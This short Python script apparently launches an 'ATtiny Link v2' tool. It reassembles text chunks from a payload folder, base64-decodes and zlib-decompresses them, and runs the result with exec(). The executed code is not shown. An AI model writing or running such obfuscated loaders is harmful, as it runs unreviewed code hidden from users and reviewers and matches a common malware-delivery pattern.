from pathlib import Path
import base64
import zlib

base = Path(__file__).resolve().parent / "attiny_link_v2_payload"
chunks = sorted(base.glob("*.txt"))
if not chunks:
    raise SystemExit("Thieu payload ATtiny Link v2")
payload = "".join(p.read_text(encoding="utf-8").strip() for p in chunks)
source = zlib.decompress(base64.b64decode(payload))
exec(compile(source, __file__, "exec"), {"__name__": "__main__", "__file__": __file__})
